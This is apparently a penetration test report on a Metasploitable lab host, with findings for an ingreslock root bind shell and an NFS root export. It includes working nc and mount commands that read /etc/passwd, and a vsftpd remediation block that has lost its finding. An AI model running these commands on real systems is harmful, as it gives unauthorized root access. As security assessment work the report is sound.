Root Shell via Bind Shell (Port 1524 - Ingreslock Backdoor)

CRITICAL
10.0
FINDING-001
excellent

Description: A root-level bind shell is listening on port 1524 (ingreslock). Any attacker can connect and obtain an interactive root shell with no authentication required. This provides complete system compromise with uid=0(root) access.

Affected Hosts:

192.168.0.140

Evidence

Exploitation command: echo 'id && whoami && hostname && uname -a && head -5 /etc/passwd' | nc -w 5 192.168.0.140 1524\n\nOutput:\nroot@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)\nroot\nmetasploitable\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync

Remediation

Remove the bind shell backdoor on port 1524. Investigate how the backdoor was installed and check for additional persistence mechanisms. Rebuild the system from a known-good image.

Affected Hosts:

192.168.0.140

Remediation

Immediately upgrade vsftpd to a version not affected by the backdoor (2.3.5+). Verify the integrity of all installed software packages. Consider replacing with a secure FTP alternative or using SFTP.

NFS Root Filesystem Export to All Hosts

CRITICAL
9.8
FINDING-003
acceptable

Description: The NFS service exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the full filesystem, read sensitive configuration files, and potentially write SSH keys for persistent access.

Affected Hosts:

192.168.0.140

Evidence

Enumeration:\n$ showmount -e 192.168.0.140\nExport list for 192.168.0.140:\n/ *\n\nExploitation:\n$ sudo mount -t nfs -o nolock,vers=3 192.168.0.140:/ /tmp/nfs_mount\n$ head -10 /tmp/nfs_mount/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n...\n\n$ ls /tmp/nfs_mount/home/\nftp msfadmin service user\n\nFull filesystem browseable including /etc/passwd, home directories, application configs.

Remediation

Restrict NFS exports to specific trusted hosts/subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication. Apply the principle of least privilege to exported paths.
